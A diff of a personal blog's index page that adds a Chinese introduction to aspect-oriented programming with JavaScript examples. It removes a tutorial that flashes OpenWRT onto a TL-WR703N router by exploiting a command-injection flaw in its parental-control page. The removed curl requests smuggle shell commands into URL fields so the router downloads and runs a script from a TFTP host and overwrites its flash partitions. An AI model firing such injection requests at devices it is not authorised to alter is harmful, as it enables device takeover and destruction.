@@ -314,6 +314,187 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2019/01/23/%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jack Huang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jack Huang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/23/%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B/" itemprop="url">
+                  面向方面编程简介
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-23 12:58:19 / 修改时间：21:34:15" itemprop="dateCreated datePublished" datetime="2019-01-23T12:58:19+08:00">2019-01-23</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="什么是面向方面编程-What"><a href="#什么是面向方面编程-What" class="headerlink" title="什么是面向方面编程(What)"></a>什么是面向方面编程(What)</h1><p>面向侧面的程序设计（aspect-oriented programming，AOP，又译作面向方面的程序设计、观点导向编程、剖面导向程序设计）是计算机科学中的一个术语，指一种程序设计范型。该范型以一种称为侧面（aspect，又译作方面）的语言构造为基础，侧面是一种新的模块化机制，用来描述分散在对象、类或函数中的横切关注点（crosscutting concern）。</p>
+<p>侧面的概念源于对面向对象的程序设计的改进，但并不只限于此，它还可以用来改进传统的函数。与侧面相关的编程概念还包括元对象协议、主题（subject）、混入（mixin）和委托。</p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
+<li>关注点（concern）：对软件工程有意义的小的、可管理的、可描述的软件组成部分，一个关注点通常只同一个特定概念或目标相关联。</li>
+<li>主关注点（core concern）：一个软件最主要的关注点。</li>
+<li>关注点分离（separation of concerns，SOC）：标识、封装和操纵只与特定概念、目标相关联的软件组成部分的能力，即标识、封装和操纵关注点的能力。</li>
+<li>方法（method）：用来描述、设计、实现一个给定关注点的软件构造单位。</li>
+<li>横切（crosscut）：两个关注点相互横切，如果实现它们的方法存在交集。</li>
+<li>支配性分解（dominant decomposition）：将软件分解成模块的主要方式。传统的程序设计语言是以一种线性的文本来描述软件的，只采用一种方式（比如：类）将软件分解成模块；这导致某些关注点比较好的被捕捉，容易进一步组合、扩展；但还有一些关注点没有被捕捉，弥散在整个软件内部。支配性分解一般是按主关注点进行模块分解的。</li>
+<li>横切关注点（crosscutting concerns）：在传统的程序设计语言中，除了主关注点可以被支配性分解方式捕捉以外，还有许多没有被支配性分解方式捕捉到的关注点，这些关注点的实现会弥散在整个软件内部，这时这些关注点同主关注点是横切的。</li>
+<li>侧面（aspect）：在支配性分解的基础上，提供的一种辅助的模块化机制，这种新的模块化机制可以捕捉横切关注点。</li>
+</ul>
+<p>从<strong>主关注点</strong>中分离出横切关注点是面向侧面的程序设计的核心概念。<strong>分离关注点</strong>使得解决特定领域问题的代码从业务逻辑中独立出来，业务逻辑的代码中不再含有针对特定领域问题代码的调用，业务逻辑同特定领域问题的关系通过<strong>侧面</strong>来封装、维护，这样原本分散在在整个应用程序中的变动就可以很好的管理起来。</p>
+<p>对于一个信用卡应用程序来说，存款、取款、帐单管理是它的主关注点，日志和持久化将成为横切整个对象结构的横切关注点。</p>
+<h1 id="为什么需要面向方面编程-Why"><a href="#为什么需要面向方面编程-Why" class="headerlink" title="为什么需要面向方面编程(Why)"></a>为什么需要面向方面编程(Why)</h1><p>AOP技术的优势是显而易见的。在面向对象的世界里，人们提出了各种方法和设计原则来保障系统的可复用性与可扩展性，以期建立一个松散耦合、便于扩展的软件系统。例如GOF提出的“设计模式”，为我们提供了设计的典范与准则。设计模式通过最大程度的利用面向对象的特性，诸如利用继承、多态，对责任进行分离、对依赖进行倒置，面向抽象，面向接口，最终设计出灵活、可扩展、可重用的类库、组件，乃至于整个系统的架构。在设计的过程中，通过各种模式体现对象的行为、暴露的接口、对象间关系、以及对象分别在不同层次中表现出来的形态。然而鉴于对象封装的特殊性，“设计模式”的触角始终在接口与抽象中大做文章，而对于对象内部则无能为力。</p>
+<p>通过“横切”技术，AOP技术就能深入到对象内部翻云覆雨，截取方法之间传递的消息为我所用。由于将核心关注点与横切关注点完全隔离，使得我们能够独立的对“方面”编程。它允许开发者动态地修改静态的OO模型，构造出一个能够不断增长以满足新增需求的系统，就象现实世界中的对象会在其生命周期中不断改变自身，应用程序也可以在发展中拥有新的功能。</p>
+<p>设计软件系统时应用AOP技术，其优势在于：</p>
+<ul>
+<li>在定义应用程序对某种服务（例如日志）的所有需求的时候。通过识别关注点，使得该服务能够被更好的定义，更好的被编写代码，并获得更多的功能。这种方式还能够处理在代码涉及到多个功能的时候所出现的问题，例如改变某一个功能可能会影响到其它的功能，在AOP中把这样的麻烦称之为“纠结（tangling）”。</li>
+<li>利用AOP技术对离散的方面进行的分析将有助于为开发团队指定一位精于该项工作的专家。负责这项工作的最佳人选将可以有效利用自己的相关技能和经验。</li>
+<li>持久性。标准的面向对象的项目开发中，不同的开发人员通常会为某项服务编写相同的代码，例如日志记录。随后他们会在自己的实施中分别对日志进行处理以满足不同单个对象的需求。而通过创建一段单独的代码片段，AOP提供了解决这一问题的持久简单的方案，这一方案强调了未来功能的重用性和易维护性：不需要在整个应用程序中一遍遍重新编写日志代码，AOP使得仅仅编写日志方面（logging aspect）成为可能，并且可以在这之上为整个应用程序提供新的功能。</li>
+</ul>
+<p>总而言之，AOP技术的优势使得需要编写的代码量大大缩减，节省了时间，控制了开发成本。同时也使得开发人员可以集中关注于系统的核心商业逻辑。此外，它更利于创建松散耦合、可复用与可扩展的大型软件系统。</p>
+<h1 id="如何实现面向方面编程-How"><a href="#如何实现面向方面编程-How" class="headerlink" title="如何实现面向方面编程(How)"></a>如何实现面向方面编程(How)</h1><p>使用js实现before（前置通知）、after（后置通知）、around（环绕通知）。</p>
+<h2 id="before（前置通知）"><a href="#before（前置通知）" class="headerlink" title="before（前置通知）"></a>before（前置通知）</h2><p>before函数，用来实现函数的前置通知。在目标函数的前面执行一些前置操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 前置通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 给方法加入前置切片函数</span><br><span class="line"> * 可以在执行方法之前执行一些操作,</span><br><span class="line"> * 前置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被前置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入前置通知的函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._before &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return __self.apply(__self, arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line">function a()&#123;</span><br><span class="line">    console.log(&#39;I\&#39;m a&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a &#x3D; a._before(function()&#123;</span><br><span class="line">    console.log(&#39;before&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line">&#x2F;&#x2F; 结果：</span><br><span class="line">&#x2F;&#x2F; before</span><br><span class="line">&#x2F;&#x2F; I&#39;m a</span><br></pre></td></tr></table></figure>
+
+<h2 id="after（后置通知）"><a href="#after（后置通知）" class="headerlink" title="after（后置通知）"></a>after（后置通知）</h2><p>after函数，用来实现函数的后置通知。在目标函数的后面面执行一些后置操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 后置通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 给方法加入后置切片函数</span><br><span class="line"> * 可以在执行方法之之后执行一些操作</span><br><span class="line"> * 后置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被后置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入后置通知的函数</span><br><span class="line"> * @constructor</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._after &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var ret &#x3D; __self.apply(__self, arguments);</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line">function b()&#123;</span><br><span class="line">    console.log(&#39;I\&#39;m b&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b &#x3D; b._after(function()&#123;</span><br><span class="line">    console.log(&#39;after&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">b();</span><br><span class="line">&#x2F;&#x2F; 结果：</span><br><span class="line">&#x2F;&#x2F; I&#39;m b</span><br><span class="line">&#x2F;&#x2F; after</span><br></pre></td></tr></table></figure>
+
+<h2 id="around（环绕通知）"><a href="#around（环绕通知）" class="headerlink" title="around（环绕通知）"></a>around（环绕通知）</h2><p>在around函数中，引入了一个JoinPoint对象。JoinPoint对象封装了目标函数和目标函数的参数。在调用JoinPoint对象的invoke函数时，会去调用原来的目标函数。在调用invoke时，如果需要改变目标函数的this对象，需要将对象传入到invoke的参数中。around函数，可以在目标函数的前面和后面随意加入逻辑代码，也可以根据条件判断是否执行目标函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; AOP 环绕通知函数声明</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 切入点对象</span><br><span class="line"> * 不允许切入对象多次调用</span><br><span class="line"> * @param obj   对象</span><br><span class="line"> * @param args  参数</span><br><span class="line"> * @constructor</span><br><span class="line"> *&#x2F;</span><br><span class="line">function JoinPoint(obj, args)&#123;</span><br><span class="line">    var isapply &#x3D; false;                       &#x2F;&#x2F; 判断是否执行过目标函数</span><br><span class="line">    var result &#x3D; null;                         &#x2F;&#x2F; 保存目标函数的执行结果</span><br><span class="line"></span><br><span class="line">    this.source &#x3D; obj;                         &#x2F;&#x2F; 目标函数对象</span><br><span class="line">    this.args &#x3D; args;                          &#x2F;&#x2F; 目标函数对象传入的参数</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 目标函数的代理执行函数</span><br><span class="line">     * 如果被调用过，不能重复调用</span><br><span class="line">     * @return &#123;object&#125; 目标函数的返回结果</span><br><span class="line">     *&#x2F;</span><br><span class="line">    this.invoke &#x3D; function(thiz)&#123;              </span><br><span class="line">        if(isapply)&#123; return; &#125;</span><br><span class="line">        isapply &#x3D; true;</span><br><span class="line">        result &#x3D; this.source.apply(thiz || this.source, this.args);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 获取目标函数执行结果</span><br><span class="line">    this.getResult &#x3D; function()&#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 方法环绕通知</span><br><span class="line"> * 原方法的执行需在环绕通知方法中执行</span><br><span class="line"> * @param func &#123;Function&#125; 环绕通知的函数</span><br><span class="line"> *     程序会往func中传入一个JoinPoint(切入点)对象, 在适当的时机</span><br><span class="line"> *     执行JoinPoint对象的invoke函数，调用目标函数</span><br><span class="line"> * </span><br><span class="line"> * @return &#123;Function&#125; 切入环绕通知后的函数，</span><br><span class="line"> *&#x2F;</span><br><span class="line">Function.prototype._around &#x3D; function(func)&#123;</span><br><span class="line">    var __self &#x3D; this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var args &#x3D; [new JoinPoint(__self, arguments)];</span><br><span class="line">        return func.apply(this, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 代码</span><br><span class="line"></span><br><span class="line">var isAdmin &#x3D; true;</span><br><span class="line"></span><br><span class="line">function c()&#123;</span><br><span class="line">    console.log(&#39;show user list&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c &#x3D; c._around(function(joinpoint)&#123;</span><br><span class="line">    if(isAdmin)&#123;    &#x2F;&#x2F; 满足条件时，执行目标函数</span><br><span class="line">        console.log(&#39;is admin&#39;);</span><br><span class="line">        joinpoint.invoke(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">c();</span><br><span class="line">&#x2F;&#x2F; 结果</span><br><span class="line">&#x2F;&#x2F; if isAdmin &#x3D;&#x3D; true</span><br><span class="line">&#x2F;&#x2F;     is admin</span><br><span class="line">&#x2F;&#x2F;     show user list</span><br><span class="line">&#x2F;&#x2F; if isAdmin &#x3D;&#x3D; false</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://zh.wikipedia.org/wiki/面向侧面的程序设计" target="_blank" rel="noopener">面向侧面的程序设计</a>,by wikipedia.</li>
+<li><a href="https://www.zhihu.com/question/24863332" target="_blank" rel="noopener">什么是面向切面编程AOP？</a>,by 知乎.</li>
+<li><a href="https://blog.csdn.net/liuweitoo/article/details/8166503" target="_blank" rel="noopener">什么是面向方面编程</a>,by liuweitoo.</li>
+<li><a href="https://blog.csdn.net/hguisu/article/details/7586704" target="_blank" rel="noopener">AOP面向方面编程</a>,by 规速.</li>
+<li><a href="https://www.jianshu.com/p/a833d114099a" target="_blank" rel="noopener">团队开发框架实战—面向切面的编程 AOP</a>,by Bobby0322.</li>
+<li><a href="https://blog.csdn.net/yanquan345/article/details/19760027" target="_blank" rel="noopener">轻松理解AOP(面向切面编程)</a>,by -望远-.</li>
+<li><a href="https://blog.csdn.net/qq_21460229/article/details/79696159" target="_blank" rel="noopener">AOP在JS中的实现及应用</a>,by _Sirius.</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2019/01/17/%E5%A6%82%E4%BD%95%E5%86%99%E5%A5%BD%E4%B8%80%E7%AF%87%E8%AE%BA%E6%96%87%E7%9A%84%E5%8D%81%E6%9D%A1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1864,200 +2045,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jack Huang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Jack Huang's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/" itemprop="url">
-                  TL-WR703N版本v1.7刷openwrt教程
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-12-31 11:49:39" itemprop="dateCreated datePublished" datetime="2018-12-31T11:49:39+08:00">2018-12-31</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2021-07-16 23:07:17" itemprop="dateModified" datetime="2021-07-16T23:07:17+08:00">2021-07-16</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。</p>
-<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
-<li>一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 在刷机之前，按reset按钮重置路由器</span><br></pre></td></tr></table></figure></li>
-<li>TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）</span><br><span class="line">curl https:&#x2F;&#x2F;downloads.openwrt.org&#x2F;snapshots&#x2F;trunk&#x2F;ar71xx&#x2F;generic&#x2F;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i1 bs&#x3D;1 count&#x3D;1048576</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i2 bs&#x3D;1 skip&#x3D;1048576</span><br></pre></td></tr></table></figure></li>
-<li>TFTP 服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装TFTP的客户端和服务器端</span><br><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure></li>
-<li>busybox 1.16.1 MIPS 版<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;binaries&#x2F;1.21.1&#x2F;busybox-mips &gt; busybox</span><br></pre></td></tr></table></figure></li>
-<li>编写Hack脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">tftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的ip</span><br><span class="line">tftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来</span><br><span class="line">tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来</span><br><span class="line">chmod 755 busybox  # 修改busybox权限以执行命令</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i1 of&#x3D;&#x2F;dev&#x2F;mtdblock1 conv&#x3D;fsync # 将i1写入磁盘分区</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i2 of&#x3D;&#x2F;dev&#x2F;mtdblock2 conv&#x3D;fsync # 将i2写入磁盘分区</span><br><span class="line">reboot -f # 重启，会启动openwrt</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h1><p>在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。</p>
-<h2 id="搭建tftp服务器"><a href="#搭建tftp服务器" class="headerlink" title="搭建tftp服务器"></a>搭建tftp服务器</h2><p>在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。</p>
-<h2 id="Hack-into-TL-WR703N"><a href="#Hack-into-TL-WR703N" class="headerlink" title="Hack into TL-WR703N"></a>Hack into TL-WR703N</h2><p>这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。</p>
-<blockquote>
-<p>【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。</p>
-</blockquote>
-<p>步骤如下：</p>
-<ul>
-<li><p>长按reboot按钮将路由器恢复出厂设置</p>
-</li>
-<li><p>将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100</p>
-</li>
-<li><p>在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 此处修改密码为admin42，注意Cookies中认证变量Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;true&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;&#39;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>启用家长控制（利用漏洞）</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?ctrl_enable&#x3D;1&amp;parent_mac_addr&#x3D;00-00-00-00-00-02&amp;Page&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>让路由器从tftp服务器下载并执行脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?Modify&#x3D;0&amp;Page&#x3D;1&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?child_mac&#x3D;00-00-00-00-00-01&amp;lan_lists&#x3D;888&amp;url_comment&#x3D;test&amp;url_0&#x3D;;cd%20&#x2F;tmp;&amp;url_1&#x3D;;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2&#x3D;;sh%20aa;&amp;url_3&#x3D;&amp;url_4&#x3D;&amp;url_5&#x3D;&amp;url_6&#x3D;&amp;url_7&#x3D;&amp;scheds_lists&#x3D;255&amp;enable&#x3D;1&amp;Changed&#x3D;1&amp;SelIndex&#x3D;0&amp;Page&#x3D;1&amp;rule_mode&#x3D;0&amp;Save&#x3D;%B1%A3+%B4%E6&#39;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="openwrt系统配置"><a href="#openwrt系统配置" class="headerlink" title="openwrt系统配置"></a>openwrt系统配置</h1><p>openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
-<li><a href="https://cubicpill.me/2018/03/17/wr703n-openwrt.html" target="_blank" rel="noopener">给 v1.7 版本的 TL-WR703N 刷 openwrt</a>,by Cubic Zone.</li>
-<li><a href="https://juejin.im/entry/5a2f92df6fb9a0450d110c14" target="_blank" rel="noopener">TL-WR703N v1.7刷openwrt</a>,by 梦里茶.</li>
-<li><a href="https://openwrt.org/toh/tp-link/tl-wr703n" target="_blank" rel="noopener">TP-Link TL-WR703N</a>,by openwrt.</li>
-<li><a href="https://huangwang.github.io/2018/12/30/Debian安装配置使用TFTP/">Debian安装配置使用TFTP</a>,by jack huang.</li>
-<li><a href="https://www.practicalnetworking.net/series/packet-traveling/packet-traveling/" target="_blank" rel="noopener">Packet Traveling</a>,by ed harmoush.</li>
-</ol>
-
-          
